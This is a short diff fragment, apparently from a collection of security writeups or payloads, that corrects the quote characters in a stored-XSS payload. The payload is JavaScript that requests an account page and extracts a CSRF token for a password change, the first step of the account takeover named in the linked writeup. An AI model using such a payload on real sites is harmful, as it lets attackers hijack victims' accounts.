@@ -22,7 +22,7 @@ https://medium.com/@bag0zathev2/csrf-stored-xss-to-leading-to-full-account-takeo
 
 <script>var req = new XMLHttpRequest();
     req.onload = handleResponse;
-    req.open(‘get’,’/account-details’,true);
+    req.open('get','/account-details',true);
     req.send();
     function handleResponse() {
     var token = this.responseText.match(/name=”csrf-passwd” value=”(\w+)”/)[1];
